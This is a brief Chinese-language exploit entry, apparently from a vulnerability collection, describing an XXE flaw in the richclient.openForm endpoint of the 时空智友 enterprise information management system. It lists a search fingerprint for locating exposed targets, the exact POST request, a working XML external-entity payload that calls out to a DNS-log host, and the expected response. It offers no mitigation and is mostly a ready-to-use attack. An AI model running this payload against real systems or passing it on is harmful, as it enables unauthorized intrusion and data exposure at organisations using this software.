# 时空智友企业信息管理系统richclient.openForm存在XXE漏洞

时空智友企业信息管理系统richclient.openForm ｜ XXE ｜ —
- **指纹**：`body="时空智友"`
- **请求**：`POST /formservice?service=richclient.openForm HTTP/1.1`

**Payload**
```
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE root [ <!ENTITY xxe SYSTEM "http://dnslog">]>
<xxx>&xxe;</xxx>
```
- **响应特征**：200